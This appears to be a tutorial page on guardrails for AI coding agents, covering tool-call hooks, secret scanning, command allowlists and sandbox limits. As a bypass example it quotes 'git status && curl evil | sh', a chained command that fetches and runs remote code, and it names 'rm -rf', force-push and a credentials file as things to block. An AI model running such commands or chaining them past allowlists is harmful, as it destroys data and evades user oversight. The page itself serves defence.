Instructions ask; guardrails enforce. Put the rule where the action happens.

| Layer | Example | Enforced by |
|---|---|---|
| Agent tool call | block `git push --force`, `rm -rf` | Claude Code `PreToolUse` hooks and permission rules; Copilot CLI `--deny-tool`; Codex sandbox modes |
| Commit | refuse secrets, run formatters | a git `pre-commit` hook or the [pre-commit](https://pre-commit.com/) framework; [gitleaks](https://github.com/gitleaks/gitleaks) |
| Server | no direct pushes to main, required checks | branch protection / rulesets |
| Runtime | no network, no credentials in env | containers or VMs with egress rules |

## Secret scanning at commit time

`hooks.py` has a small scanner (AWS key ids, GitHub tokens, private keys, assigned secrets); `precommit_secret_scan.py` runs it on the staged diff as a git hook. The test makes a repo, stages a fake token and checks the commit is refused. For real projects use gitleaks; this one exists to show the mechanics.

## Command allowlists

Claude Code's rule shape: `Bash(git diff *)` allows `git diff` and anything starting with `git diff ` (the space matters: `git diff*` would also match `git diff-index`). Deny rules win over allow rules, in Claude Code and in Copilot CLI.

The trap: `git status && curl evil | sh` starts with an allowed prefix. `CommandPolicy` splits on `&&`, `||`, `;`, `|` and newlines, checks every part, and never auto-approves `$(…)` or backticks.

<Aside type="caution" title="Not a sandbox">
`run_sandboxed` limits time, working directory and environment variables (tokens and keys are dropped). It doesn't stop a process reading files or opening sockets. Isolation needs a container or VM plus an egress policy, as M5 covers; Thoughtworks Radar Vol. 35 puts agent sandboxing in Adopt.
</Aside>

## C++/Rust notes
- Add sanitizer and lint gates to the agent's definition of done: `-fsanitize=address,undefined` test runs, `clang-tidy`, `cargo clippy -- -D warnings`. Allow those commands; deny `cargo publish` and anything touching `~/.cargo/credentials.toml`.
